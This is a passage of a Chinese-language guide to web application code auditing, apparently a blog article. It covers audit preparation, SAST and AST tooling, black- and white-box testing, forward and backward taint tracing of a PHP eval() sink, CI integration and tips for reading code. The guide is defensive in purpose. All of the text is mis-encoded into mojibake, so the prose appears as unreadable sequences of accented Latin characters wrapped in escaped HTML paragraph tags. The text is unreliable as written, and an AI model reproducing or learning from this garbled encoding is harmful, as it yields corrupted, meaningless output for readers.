&lt;p>æ²¡æœ‰å·¥å…·æ˜¯æ‰€è°“é“¶å¼¹ï¼Œå®˜æ–¹è§„åˆ™ã€æ’ä»¶å‡†å¬ç‡å¾ˆä½ï¼Œéœ€è¦æ ¹æ®å¼€å‘è¯­è¨€ã€ç¼–ç é£æ ¼è‡ªå®šä¹‰ï¼›å·¥å…·å¯¹é€»è¾‘æ¼æ´çš„æ— åŠ›ï¼Œä¸ä¸šåŠ¡é€»è¾‘æ¼æ´å¤§é‡æ›å…‰çš„æ¼æ´æ€åŠ¿ä¹‹é—´çš„çŸ›ç›¾ï¼Œå·¥å…·ã€ç³»ç»Ÿçš„è¿è¥ä¹Ÿéœ€è¦ä¸“é—¨äººåŠ›æŠ•å…¥ï¼Œä»è€Œä¸æ–­æé«˜å·¥å…·çš„å‡†å¬ç‡ã€‚&lt;/p>
&lt;p>å¿ƒæ€
å®¡è®¡äººå‘˜å‡ºäºKPIçš„è€ƒè™‘ï¼Œæƒ³ç€æ—¢ç„¶èŠ±äº†å¾ˆé•¿æ—¶é—´åšäº†ä»£ç å®¡è®¡ï¼Œä¸ºäº†ä½“ç°å·¥ä½œé‡å°±å¿…é¡»è¯´ç‚¹ä»€ä¹ˆï¼Œå¦‚æœç³»ç»Ÿæœ¬æ¥æ²¡æœ‰é—®é¢˜å´åœ¨é‚£æŒ‘åˆºï¼Œå¼€å‘è€…ä¼šæ›´åŠ ä¸ä¿¡ä»»ä½ ã€‚å¯¹äºç”²æ–¹ä»£ç å®¡è®¡äººå‘˜ï¼Œå®¡è®¡ä»»åŠ¡å¤šã€ä»£ç åºå¤§æ˜¯å¸¸æ€ï¼Œå¦‚æœä¸è€ƒè™‘åæœçš„åªæé«˜é€Ÿåº¦ï¼Œè¿™ç§æ–¹å¼ä¼šé—æ¼æ‰ç»†èŠ‚ï¼Œå¯¼è‡´ä¸èƒ½å…¨é¢çš„å®¡æŸ¥ã€‚&lt;/p>
&lt;p>ä¸‰ã€å®¡è®¡æ•´ä½“æ€è·¯&lt;/p>
&lt;p>å‡†å¤‡å·¥ä½œ
è·å¾—æºç 
ã€€ã€€è¦å®¡è®¡å½“ç„¶è¦å…ˆè·å¾—ç›¸åº”çš„æºç ï¼Œæœ€å¥½æœ‰ç›¸å…³æ–‡æ¡£ç­‰ï¼Œèµ„æ–™è¶Šå¤šè¶Šæ˜“äºç†è§£æºç ã€‚&lt;/p>
&lt;p>å®‰è£…ç½‘ç«™
ã€€ã€€åœ¨æœ¬åœ°æ­å»ºç½‘ç«™ï¼Œä¸€è¾¹å®¡è®¡ä¸€è¾¹è°ƒè¯•ã€‚é€šè¿‡è·Ÿè¸ªå„ç§åŠ¨æ€å˜åŒ–äº†è§£æºç çš„ä½œç”¨ã€‚&lt;/p>
&lt;p>ç½‘ç«™ç»“æ„
ã€€ã€€æµè§ˆæºç æ–‡ä»¶å¤¹ï¼Œäº†è§£è¯¥ç¨‹åºçš„å¤§è‡´ç›®å½•&lt;/p>
&lt;p>å…¥å£æ–‡ä»¶
indexã€adminæ–‡ä»¶ä¸€èˆ¬æ˜¯æ•´ä¸ªç¨‹åºçš„å…¥å£ï¼Œè¯¦ç»†è¯»ä¸€ä¸‹indexæ–‡ä»¶å¯ä»¥çŸ¥é“ç¨‹åºçš„æ¶æ„ã€è¿è¡Œæµç¨‹ã€åŒ…å«é‚£äº›é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«å“ªäº›è¿‡æ»¤æ–‡ä»¶ä»¥åŠåŒ…å«é‚£äº›å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼Œäº†è§£ç¨‹åºçš„ä¸šåŠ¡é€»è¾‘ã€‚&lt;/p>
&lt;p>é…ç½®æ–‡ä»¶
ã€€ã€€ä¸€èˆ¬ç±»ä¼¼configç­‰æ–‡ä»¶ï¼Œä¿å­˜ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯ã€ç¨‹åºçš„ä¸€äº›ä¿¡æ¯ã€‚å…ˆçœ‹çœ‹æ•°æ®åº“ç¼–ç ï¼Œå¦‚æœæ˜¯gbkåˆ™å¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚å¦‚æœå˜é‡çš„å€¼ç”¨åŒå¼•å·ã€åˆ™å¯èƒ½å­˜åœ¨åŒå¼•å·è§£æä»£ç æ‰§è¡Œçš„é—®é¢˜ã€‚&lt;/p>
&lt;p>è¿‡æ»¤åŠŸèƒ½
é€šè¿‡è¯¦è¯» å…¬å…±å‡½æ•°æ–‡ä»¶ å’Œ å®‰å…¨è¿‡æ»¤æ–‡ä»¶ ç­‰æ–‡ä»¶ï¼Œæ¸…æ™°æŒæ¡ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œå“ªäº›è¢«è¿‡æ»¤ï¼Œå“ªäº›æ— è¿‡æ»¤ï¼Œåœ¨å“ªé‡Œè¢«è¿‡æ»¤äº†ï¼Œå¦‚ä½•è¿‡æ»¤çš„ï¼Œèƒ½å¦ç»•è¿‡è¿‡æ»¤çš„æ•°æ®ã€‚è¿‡æ»¤çš„æ–¹å¼æ˜¯æ›¿æ¢è¿˜æ˜¯æ­£åˆ™ï¼Ÿæœ‰æ²¡æœ‰GPCï¼Ÿæœ‰æ²¡æœ‰ä½¿ç”¨addslasher()å¤„ç†ï¼Ÿ&lt;/p>
&lt;p>2ã€å®¡è®¡æ–¹æ³•&lt;/p>
&lt;p>2.1ã€è‡ªåŠ¨æ‰‹åŠ¨ç»“åˆ&lt;/p>
&lt;p>ä»£ç æ‰«æå·¥å…·-&amp;gt;ast/æ­£åˆ™è¡¨è¾¾å¼-&amp;gt;å¤æ ¸&lt;/p>
&lt;p>è¯æ³•åˆ†æ-&amp;gt;è¯­æ³•åˆ†æ-&amp;gt;ï¼ˆè¯­ä¹‰åˆ†æ-&amp;gt;ä¸­é—´ä»£ç ï¼‰-&amp;gt;AST&lt;/p>
&lt;p>æŒ‰ç…§é¢„å®šçš„è§„åˆ™åˆå¹¶æˆä¸€ä¸ªä¸ªçš„æ ‡è¯†tokensã€‚åŒæ—¶ï¼Œå®ƒä¼šç§»é™¤ç©ºç™½ç¬¦ï¼Œæ³¨é‡Šï¼Œç­‰ã€‚æœ€åï¼Œæ•´ä¸ªä»£ç å°†è¢«åˆ†å‰²è¿›ä¸€ä¸ªtokensåˆ—è¡¨ï¼ˆæˆ–è€…è¯´ä¸€ç»´æ•°ç»„ï¼‰ã€‚å°†è¯æ³•åˆ†æå‡ºæ¥çš„æ•°ç»„è½¬åŒ–æˆæ ‘å½¢çš„è¡¨è¾¾å½¢å¼ã€‚åŒæ—¶ï¼ŒéªŒè¯è¯­æ³•ï¼Œè¯­æ³•å¦‚æœæœ‰é”™çš„è¯ï¼ŒæŠ›å‡ºè¯­æ³•é”™è¯¯ã€‚è§£æå™¨ä¼šåˆ é™¤ä¸€äº›æ²¡å¿…è¦çš„æ ‡è¯†tokensï¼ˆæ¯”å¦‚ä¸å®Œæ•´çš„æ‹¬å·ï¼‰ï¼Œå› æ­¤ASTä¸æ˜¯100%ä¸æºç åŒ¹é…çš„ï¼Œè§£æå™¨100%è¦†ç›–æ‰€æœ‰ä»£ç ç»“æ„ç”Ÿæˆæ ‘å«åšCSTï¼ˆå…·ä½“è¯­æ³•æ ‘ï¼‰ã€‚ä»¥ä¸‹ä»‹ç»ä¸€äº›ä¸»æµwebå¼€å‘è¯­è¨€çš„ast parserï¼š&lt;/p>
&lt;p>â€¢ åœ¨çº¿parser&lt;/p>
&lt;p>â€¢ php-parsesr&lt;/p>
&lt;p>â€¢ python-parser&lt;/p>
&lt;p>â€¢ go-parser&lt;/p>
&lt;p>â€¢ js-parser&lt;/p>
&lt;p>â€¢ java-parser&lt;/p>
&lt;p>ç»“åˆå¼€æºã€å•†ä¸šsastå·¥å…·è¿›è¡Œæ¼æ´å’Œé£é™©æ‰«æè¾“å‡ºåˆæ­¥æ£€æµ‹æŠ¥å‘Šï¼Œç„¶åäººå·¥å¤æ ¸å‡†ç¡®æ€§ï¼Œä¸æ–­ä¼˜åŒ–sastæ‰«æè§„åˆ™ï¼ŒåŒæ—¶æé«˜æ¼æ´æŒ–æ˜é€Ÿåº¦ã€‚&lt;/p>
&lt;p>2.2ã€é»‘ç™½ç›’ç»“åˆ&lt;/p>
&lt;p>é»‘ç›’æ±‚è¦†ç›–-&amp;gt;ç™½ç›’æ±‚é‡ç‚¹&lt;/p>
&lt;p>é€šè¿‡é»‘ç›’æ¥å…¨éƒ¨è¦†ç›–æ‰€æœ‰ä¸šåŠ¡cgiï¼ŒåŒæ—¶é€šè¿‡ç™½ç›’æµ‹è¯•è¦†ç›–é‡è¦ä¸šåŠ¡cgiï¼Œé»‘ç›’å¿«é€ŸéªŒè¯ã€ç™½ç›’æŒ–æ˜æ ¹å› æˆ–è€…ç ”ç©¶ç»•è¿‡ç­–ç•¥ï¼Œä»è€Œå®ç°å®ç°æ•ˆç‡ä¸é‡è¦æ€§çš„å¹³è¡¡ã€‚å¦å¤–ï¼Œè¿™é‡Œå»ºè®®ä½¿ç”¨è¢«åŠ¨æ‰«æå™¨è¿›è¡Œå¿«é€Ÿæµé‡å›æ”¾ï¼Œå®ç°æµé‡é‡‡é›†ä¸æ¼æ´æµ‹è¯•çš„åŒæ­¥æ‰§è¡Œï¼Œå¤§å¤§æé«˜æµ‹è¯•æ•ˆç‡ã€‚åŒæ—¶ä¹Ÿå»ºè®®å°†cgiä¸åŠŸèƒ½æ•´ç†å‡ºæ¥ï¼Œä¸ç„¶ç™½ç›’å®¡è®¡åœ¨ç†è§£ä¸šåŠ¡å’Œä»£ç é€»è¾‘ä¸Šçš„æˆæœ¬ä¼šéå¸¸é«˜ã€‚&lt;/p>
&lt;p>2.3ã€æ­£åå‘è·Ÿè¸ª&lt;/p>
&lt;p>â€¢ æ­£å‘ï¼šå˜é‡-&amp;gt;å‡½æ•°/æ•æ„Ÿæ“ä½œ-&amp;gt;è¾“å‡º&lt;/p>
&lt;p>$_GET-&amp;gt;$param-&amp;gt;eval($param)-&amp;gt;return $param&lt;/p>
&lt;p>ä»å‚æ•°æ¥æ”¶å…¥å£å¼€å§‹è·Ÿè¸ªæ•°æ®æµï¼Œæ˜¯ä¸€ç§æ­£å‘è¿½è¸ªçš„æ€è·¯ã€‚ä¼˜ç‚¹æ˜¯æ–¹ä¾¿ç†è§£ç¨‹åºæ•´ä½“æ¡†æ¶ï¼Œç›¸å¯¹å®¹æ˜“å®šä½é€»è¾‘æ¼æ´ã€‚ä½†æ˜¯åœ¨ä»£ç é‡è¾ƒå¤§ã€ä»£ç ç»“æ„åŒ–ä¸å¼ºçš„æƒ…å†µä¸‹äººå·¥å®¡è®¡æˆæœ¬å¾ˆé«˜ï¼ŒROIå¯èƒ½ä¸æ˜æ˜¾ï¼Œè¿™ç§æƒ…å†µä¸‹ç»“åˆSASTå·¥å…·è¿›è¡Œå®¡è®¡æ•ˆæœä¼šæ›´å¥½ã€‚&lt;/p>
&lt;p>â€¢ åå‘ï¼šå‡½æ•°/æ•æ„Ÿæ“ä½œå›æº¯-&amp;gt;è¾“å‡º&lt;/p>
&lt;p>eval($param)-&amp;gt;$param-&amp;gt;$GET-&amp;gt;return $param&lt;/p>
&lt;p>æ ¹æ®æ•æ„Ÿå…³é”®å­—æ¥å›æº¯ä¼ å…¥çš„å‚æ•°ï¼Œæ˜¯ä¸€ç§é€†å‘è¿½è¸ªçš„æ€è·¯ã€‚ä¼˜ç‚¹æ˜¯ä»…éœ€è¦æœç´¢ç›¸åº”æ•æ„Ÿå…³é”®å­—ï¼Œå°±å¯ä»¥å¿«é€ŸæŒ–æ˜æ¼æ´ï¼Œå¯å®šå‘æŒ–æ˜ï¼Œé«˜æ•ˆï¼Œé«˜è´¨é‡ï¼Œä½†ä¹Ÿå› ä¸ºæ²¡æœ‰é€šè¯»ä»£ç ï¼Œå¯¹ç¨‹åºæ•´ä½“æ¡†æ¶ä¸ç†Ÿæ‚‰ï¼Œå®šä½æ—¶ä¼šèŠ±è´¹æ—¶é—´ï¼Œé€»è¾‘æ¼æ´æŒ–æ˜è¾ƒä¸ºå›°éš¾ã€‚åŒç†ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿéœ€è¦ç»“åˆSASTå·¥å…·æ¥åšï¼Œå› ä¸ºSASTå·¥å…·å¯¹æ•æ„Ÿå‡½æ•°çš„æ§åˆ¶æµè·Ÿè¸ªæ•ˆæœè¾ƒå¥½ï¼Œæ–¹ä¾¿äººå·¥åç»­å›æº¯å˜é‡ã€‚&lt;/p>
&lt;p>2.4ã€åŠ¨é™ç»“åˆ&lt;/p>
&lt;p>ï¼ˆ1ï¼‰é™æ€å®¡è®¡&lt;/p>
&lt;p>é€šè¿‡é™æ€åˆ†ææºç ï¼Œå‘ç°æºç ä¸­çš„é€»è¾‘ã€æ•°æ®å¤„ç†ã€å‡½æ•°ä½¿ç”¨ä¸å½“æ¥ç¡®è®¤æºç ä¸­å¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚å¯ä»¥é€šè¿‡è§„åˆ™åŒ¹é…å’Œä»£ç è§£ææ³•å¼€å±•ï¼Œä¸è¿‡è¿™å—å¯ä»¥äº¤ç»™SASTå·¥å…·å»åšã€‚&lt;/p>
&lt;p>ï¼ˆ2ï¼‰è§„åˆ™åŒ¹é…&lt;/p>
&lt;p>é€šè¿‡ç¼–å†™æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¼€å‘è¯­è¨€æˆ–è€…å¼€å‘æ¡†æ¶çš„é»˜è®¤å˜é‡ä¸é«˜å±å‡½æ•°è¿›è¡ŒåŒ¹é…ï¼Œæ¯”å¦‚phpçš„é»˜è®¤å˜é‡$GETã€$POSTï¼Œé«˜å±å‡½æ•°eval()ã€exec()ç­‰ã€‚&lt;/p>
&lt;p>ï¼ˆ3ï¼‰ä»£ç è§£ææ³•&lt;/p>
&lt;p>é€šè¿‡è§£æä»£ç çš„è¯­æ³•ï¼Œåˆ†æå‡ºä»£ç æ‰§è¡Œæµç¨‹ï¼Œè¿™å—å¦‚æœé‡‡ç”¨è‡ªåŠ¨åŒ–æ‰‹æ®µä¾¿å±äºå‰æ–‡æ‰€è¯´ASTï¼Œæ‰€ä»¥è¯´ä¸åŒæ€è·¯ä¹‹é—´ä¹Ÿæœ‰ç›¸é€šä¹‹å¤„ã€‚&lt;/p>
&lt;p>ï¼ˆ4ï¼‰åŠ¨æ€å®¡è®¡&lt;/p>
&lt;p>é€šè¿‡è¿è¡Œéœ€è¦å®¡è®¡çš„ä»£ç ï¼Œç»“åˆä½¿ç”¨æ–­ç‚¹è°ƒè¯•çš„æ–¹æ³•è·Ÿè¸ªæ•°æ®çš„æµè½¬æ¥åˆ¤æ–­ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚è¿™å—å¯ä»¥äº¤ç»™DASTæˆ–è€…IASTå·¥å…·å»åšã€‚æ³¨æ„ä¸€å¼€å§‹åªéœ€è¦å…³æ³¨æˆ‘ä»¬å…³å¿ƒçš„æ¼æ´ç±»å‹ï¼šé«˜å±æ–‡ä»¶ã€é«˜å±å‡½æ•°ä»¥åŠå¸¸è§„Webæ¼æ´ã€‚&lt;/p>
&lt;p>2.5ã€è¿‡å¾€ä¸å½“ä¸‹ç»“åˆ&lt;/p>
&lt;p>â€¢ æ˜¯å¦é‡‡ç”¨å­˜åœ¨æ¼æ´çš„æ¡†æ¶ç‰ˆæœ¬ï¼›&lt;/p>
&lt;p>â€¢ æ˜¯å¦å‡ºè‡ªåŒä¸€ä¸ªå­˜åœ¨ä¸è‰¯ç¼–ç ä¹ æƒ¯æˆ–å®‰å…¨æ„è¯†è–„å¼±çš„å¼€å‘è€…ä¹‹æ‰‹ï¼›&lt;/p>
&lt;p>â€¢ æ˜¯å¦å‡ºç°è¿‡æ¼æ´ï¼Œå¯èƒ½æ²¡å½»åº•ä¿®å¤æˆ–è€…å…¶ä»–ä¸šåŠ¡æœ‰ç±»ä¼¼çš„é—®é¢˜ï¼›&lt;/p>
&lt;p>â€¢ è¿™ä¸ªåŠŸèƒ½ã€æ¨¡å—ã€ç±»ã€å‡½æ•°å‡ºç°çš„æ¼æ´æ˜¯å¦å¯èƒ½å‡ºç°åœ¨å…¶ä»–åŠŸèƒ½æ¨¡å—ã€ç±»å‡½æ•°ã€‚&lt;/p>
&lt;p>2.6ã€checklistä¸å®‰å…¨ç¼–ç è§„èŒƒç»“åˆ&lt;/p>
&lt;p>æ¢³ç†å¸¸è§æ¼æ´åœºæ™¯ã€å¸¸è§æ¼æ´ç±»å‹ã€å¸¸è§åŠŸèƒ½å®‰å…¨ç¼–ç æ¨¡æ¿ï¼Œå¯¹æ¯”å®ç°æ–¹å¼ï¼Œç¼–ç è§„èŒƒå¯ä»¥å‚è€ƒã€ŠOWASPå®‰å…¨ç¼–ç è§„èŒƒã€‹ï¼Œç›¸å…³checklistå¯ä»¥ä¸‹ä¸€éƒ¨åˆ†çš„å†…å®¹ã€‚&lt;/p>
&lt;p>2.7ã€é€šè¯»ä¸èµ°è¯»ç»“åˆ&lt;/p>
&lt;p>ç±»ä¼¼è‹±è¯­é˜…è¯»æ–‡ç« çš„é˜…è¯»æŠ€å·§ï¼Œå…ˆç²—ç•¥è¯»ä¸€éï¼Œå†æ ¹æ®æ¼æ´ç±»å‹ä¸ä¸šåŠ¡åœºæ™¯è·³ç€è¯»ã€‚&lt;/p>
&lt;p>â€¢ é¦–å…ˆè¦çœ‹ç¨‹åºçš„å¤§ä½“ä»£ç ç»“æ„&lt;/p>
&lt;p>å¦‚ä¸»ç›®å½•æœ‰å“ªäº›æ–‡ä»¶ï¼Œæ¨¡å—ç›®å½•æœ‰å“ªäº›æ–‡ä»¶ï¼Œæ’ä»¶ç›®å½•æœ‰å“ªäº›æ–‡ä»¶ï¼Œé™¤äº†å…³æ³¨æœ‰å“ªäº›æ–‡ä»¶ï¼Œè¿˜è¦æ³¨æ„æ–‡ä»¶çš„å¤§å°ã€åˆ›å»ºæ—¶é—´ã€‚æŸ¥çœ‹ç‰ˆæœ¬ç®¡ç†å†å²è®°å½•ï¼Œå¤§æ¦‚äº†è§£æ•´å¥—ä»£ç æ›´æ–°è¿­ä»£è¿‡ç¨‹ã€‚&lt;/p>
&lt;p>â€¢ å…³æ³¨æ¡†æ¶æ–‡ä»¶ã€æ ¸å¿ƒåŠŸèƒ½&lt;/p>
&lt;p>å‡½æ•°é›†æ–‡ä»¶ï¼ˆå…¬å…±åº“ç±»å‡½æ•°ï¼‰ã€é…ç½®æ–‡ä»¶ï¼ˆçœ‹å•å¼•å·ã€åŒå¼•å·ï¼Œçœ‹å…¨å±€é…åˆæˆ–è€…è·¯ç”±ï¼‰ã€å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼ˆé˜²æŠ¤ä»£ç ï¼‰ã€indexæ–‡ä»¶ï¼ˆå…¥å£æ–‡ä»¶ï¼‰ï¼Œä¹Ÿçœ‹èº«ä»½è®¤è¯ã€æƒé™æ§åˆ¶ã€æ•°æ®åº“æ“ä½œã€æ–‡ä»¶ä¸Šä¼ ä¹‹ç±»çš„æ ¸å¿ƒåŠŸèƒ½å®ç°é€»è¾‘ã€‚&lt;/p>
&lt;p>å››ã€ä¸šåŠ¡è½åœ°&lt;/p>
&lt;p>1ã€ä¾èµ–ä»£ç ä»“åº“å’Œä¸šåŠ¡åŸºç¡€ä¿¡æ¯&lt;/p>
&lt;p>ï¼ˆ1ï¼‰å®‰å…¨èµ„äº§ç®¡ç†ï¼šè¿›è¡Œä»£ç å®¡è®¡å‰å¿…é¡»æœ‰å®Œå–„çš„èµ„äº§å¤§ç›˜ï¼Œäº†è§£ä¸šåŠ¡ã€è´£ä»»äººã€ç»„ç»‡æ¶æ„çš„å¯¹åº”å…³ç³»ï¼Œè¿™æ ·æ‰èƒ½åœ¨æ˜ç¡®å®‰å…¨æ€åŠ¿çš„åŸºç¡€ä¸Šé€‰æ‹©ä»£ç å®¡è®¡çš„å¯¹è±¡ã€ä¼˜å…ˆçº§ã€æ–¹æ³•ã€æ‰‹æ®µï¼›&lt;/p>
&lt;p>ï¼ˆ2ï¼‰ä»£ç è·å–ï¼šæ˜ç¡®å®¡è®¡å¯¹è±¡åï¼Œéœ€è¦é€šè¿‡èµ„äº§å¤§ç›˜æ‰¾åˆ°å¼€å‘å›¢é˜Ÿï¼Œé€šè¿‡ä»£ç ä»“åº“çš„æƒé™ç”³è¯·æµç¨‹è·å–ä»£ç ï¼›&lt;/p>
&lt;p>ï¼ˆ3ï¼‰æ¶æ„ã€cgiæ¥å£ã€ä¸šåŠ¡é€»è¾‘ å®¡è®¡å‰éœ€è¦äº†è§£ä¸šåŠ¡æ¶æ„æ¥åˆæ­¥è¯„ä¼°å®¡è®¡èŒƒå›´ï¼Œäº†è§£cgiæ¥å£å’Œä¸šåŠ¡é€»è¾‘å¯åŠ å¿«å®¡è®¡é€Ÿåº¦ï¼Œå¿«é€Ÿå®šä½æ¼æ´å’Œé£é™©ã€‚&lt;/p>
&lt;p>2ã€å¹³å°åŒ–å»ºè®¾&lt;/p>
&lt;p>ä¸æ–­å¢å¤šçš„ä»£ç ä»¥åŠæ¶æ„çš„å¤æ‚æ€§å†³å®šäº†ä»£ç å®¡è®¡å¿…é¡»èµ°å¹³å°åŒ–å»ºè®¾é“è·¯ï¼Œé€šè¿‡å°†SASTå·¥å…·ä¸CIç³»ç»Ÿæ‰“é€šï¼Œå®ç°è‡ªåŠ¨åŒ–æ¼æ´æ‰«æï¼Œåœ¨å‘ç°æ¼æ´åå¯è‡ªåŠ¨åˆ›å»ºæ¼æ´å·¥å•ï¼Œå¹¶æŒ‰ç…§å·²æœ‰çš„å®¡è®¡æµç¨‹è¿›è¡Œå¤æ ¸ä»¥åŠå¼€å±•äººå·¥å®¡è®¡ã€‚&lt;/p>
&lt;p>ï¼ˆ1ï¼‰CIç³»ç»Ÿä¸SASTå·¥å…·ï¼šä¾‹å¦‚SASTå·¥å…·SonarQubeåŠå…¶æ’ä»¶Find Security Bugä¸CIç³»ç»ŸJenkinså°±æ˜¯ä¸€å¥—ä½æˆæœ¬çš„å®ç°æ–¹æ¡ˆï¼›&lt;/p>
&lt;p>ï¼ˆ2ï¼‰æ¼æ´ç®¡ç†ç³»ç»Ÿ(JIRA)ï¼šè¿›å…¥åˆ°ä»£ç å®¡è®¡é˜¶æ®µçš„ä¼ä¸šï¼Œé€šå¸¸å·²ç»æœ‰ç›¸å¯¹å®Œå–„çš„æ¼æ´ç®¡ç†ç³»ç»Ÿå’Œå·¥å•å¤„ç†æµç¨‹ï¼Œå¯ä»¥å°†SASTç”Ÿæˆçš„æŠ¥è¡¨è§£æã€è¿‡æ»¤åå†æ¨åˆ°æ¼æ´ç®¡ç†ç³»ç»Ÿï¼›&lt;/p>
&lt;p>ï¼ˆ3ï¼‰å®¡è®¡æµç¨‹ç®¡ç†ï¼šè¿™å—ä¸»è¦æ˜ç¡®å®¡è®¡è¿‡ç¨‹çš„ä»»åŠ¡è·Ÿè¸ªã€æ£€æŸ¥è¦†ç›–ç‡ã€ROIè¯„ä»·ã€‚&lt;/p>
&lt;p>äº”ã€å®¡è®¡æŠ€å·§&lt;/p>
&lt;p>1ã€å¦‚ä½•å¿«é€Ÿçœ‹æ‡‚ä»£ç &lt;/p>
&lt;p>ç®€å•æ¥è¯´ï¼Œä¾¿æ˜¯å…³æ³¨å¼€å‘æ¨¡å¼ã€å¼€å‘æ¡†æ¶ï¼Œè¯»å°½å¯èƒ½å°‘çš„ä»£ç ã€ä»è·¯ç”±ä¸cgiçš„æ˜ å°„å…³ç³»å…¥æ‰‹ï¼Œç»“åˆIDEå»é˜…è¯»ä»£ç ã€‚&lt;/p>
&lt;p>ï¼ˆ1ï¼‰ç”¨mvcæˆ–è€…mvvmæ¶æ„æ€ç»´å»ç†è§£ï¼šå¤§éƒ¨åˆ†webç³»ç»Ÿéƒ½æ˜¯æŒ‰ç…§modelï¼ˆæ•°æ®åº“æ¨¡å‹ï¼‰-viewï¼ˆç”¨æˆ·äº¤äº’ï¼‰-controllerï¼ˆåå°ä¸šåŠ¡é€»è¾‘ï¼‰çš„æ¶æ„å»è®¾è®¡å¼€å‘çš„ï¼Œè¿‘å¹´æ¥è¶Šæ¥è¶Šæµè¡Œçš„mvmmï¼ˆmodel-view-viewmodelï¼‰æ¶æ„ä¹Ÿæ˜¯åœ¨æ­¤åŸºç¡€ä¸Šæ¼”å˜è€Œæ¥ï¼Œä¸¤ç§åŒºåˆ«åœ¨äºmvvmçš„ViewControlæŠ½ç¦»äº†mvcçš„Controllerä¸­çš„ä¸šåŠ¡é€»è¾‘ï¼Œå®ç°ä¸šåŠ¡é€»è¾‘ç»„ä»¶çš„å¤ç”¨ã€‚å®¡è®¡æ—¶å¯ä»¥ç›´æ¥å»Controlleræˆ–è€…ViewModelä¸­æ‰¾ç›¸åº”çš„ä¸šåŠ¡é€»è¾‘ï¼›&lt;/p>
&lt;p>ï¼ˆ2ï¼‰åŒºåˆ†å‰åç«¯ä»£ï¼š å‰åç«¯åˆ†ç¦»ä¹Ÿæ˜¯è¿‘å¹´æ¥æµè¡Œçš„å¼€å‘æ¨¡å¼ï¼Œå‰ç«¯éƒ¨åˆ†é€šå¸¸åªä¼šå‡ºç°xssæ¼æ´ï¼Œé€šè¿‡åŒºåˆ†å‰åç«¯ä»£ç ï¼Œå¯ä»¥é¿å…åœ¨å‰ç«¯ä»£ç éƒ¨åˆ†æµªè´¹æ—¶é—´å»å®šä½sqlæ³¨å…¥ã€è¶Šæƒæ¼æ´ä¹‹ç±»çš„åç«¯é€»è¾‘æ‰ä¼šå‡ºç°çš„æ¼æ´ï¼›&lt;/p>
&lt;p>ï¼ˆ3ï¼‰å…ˆæ‰¾è·¯ç”±ä¸é€»è¾‘ä»£ç å¯¹åº”å…³ç³»ï¼šè·¯ç”±é€šå¸¸å‡ºç°åœ¨é…ç½®æˆ–è€…mvcæ¶æ„çš„controllerä¸­ï¼Œé€šè¿‡æ–‡ä»¶ç›®å½•æˆ–è€…ç±»å‡½æ•°çš„publicå±æ€§æ¥å®šä½ï¼Œæˆ–è€…åœ¨urlè·¯ç”±è¡¨ä¸­ç›´æ¥å®šä¹‰ï¼›&lt;/p>
&lt;p>ï¼ˆ4ï¼‰è®ºIDEçš„é‡è¦æ€§ï¼šIDEé€šå¸¸ä¼šæ˜¾ç¤ºç±»æˆ–è€…å‡½æ•°çš„Definitionå’ŒReferenceï¼Œé€šè¿‡é“¾æ¥å¯ä»¥å¿«é€Ÿè·Ÿè¸ªä»£ç è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å†…åµŒçš„æœç´¢åŠŸèƒ½å¿«é€Ÿå®šä½å…³é”®å­—ï¼Œæ¯”èµ·å‘½ä»¤è¡Œä¸‹æŸ¥æ‰¾å…³é”®å­—æ–¹ä¾¿å¾ˆå¤šã€‚&lt;/p>
&lt;p>2ã€ä¸šåŠ¡æ€ç»´&lt;/p>
&lt;p>è¿™é‡Œå¼ºè°ƒä¸šåŠ¡æ€ç»´ï¼Œæ˜¯è¯´è¶Šäº†è§£ä¸šåŠ¡ï¼Œè¶Šèƒ½ä»å¼€å‘è€…å’Œç”¨æˆ·è§’åº¦å»æ€è€ƒè®¾è®¡å’Œä½¿ç”¨ä¸Šå¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼Œå¯¹é€»è¾‘æ¼æ´æŒ–æ˜éå¸¸é‡è¦ã€‚&lt;/p>
&lt;p>ï¼ˆ1ï¼‰è®©ä¸šåŠ¡æä¾›åº”ç”¨ç¨‹åºçš„è®¾è®¡æ–‡æ¡£ã€æ¶æ„æ–‡æ¡£ï¼Œä»¥ä¾¿ä»åŠŸèƒ½ä¸Šå¿«é€Ÿç†è§£ä¸šåŠ¡é€»è¾‘ï¼›&lt;/p>
&lt;p>ï¼ˆ2ï¼‰å§‹ç»ˆè®°ä½ç”¨æˆ·å¯ä»¥æ§åˆ¶è¯·æ±‚çš„æ¯ä¸€ä¸ªæ–¹é¢ï¼Œä»–ä»¬å¯ä»¥æŒ‰ç…§ä»»æ„é¡ºåºè®¿é—®å¤šé˜¶æ®µåŠŸèƒ½ï¼Œå¯ä»¥æäº¤ç•¸å½¢æ•°æ®ï¼Œå¯ä»¥å¿½ç•¥æŸäº›å‚æ•°ï¼Œå¯ä»¥ä¼ªé€ æŸäº›å‚æ•°ï¼Œå¯ä»¥ä¿®æ”¹æŸäº›å‚æ•°ã€‚å› æ­¤åœ¨è®¾è®¡çš„æ—¶å€™ä¸€å®šå°½å¯èƒ½è¦é¢é¢ä¿±åˆ°ï¼›&lt;/p>
&lt;p>ï¼ˆ3ï¼‰ä»å„ä¸ªè§’åº¦è€ƒè™‘ä¸¤ä¸ªå› ç´ ï¼šåº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç†ç”¨æˆ·çš„åå¸¸æ“ä½œå’Œè¾“å…¥çš„ï¼Œä¸åŒä»£ç ç»„ä»¶ä¸åº”ç”¨ç¨‹åºåŠŸèƒ½ä¹‹é—´çš„ç›¸äº’ä¾èµ–æ“ä½œå¯èƒ½é€ æˆä¸åˆ©å½±å“ï¼›&lt;/p>
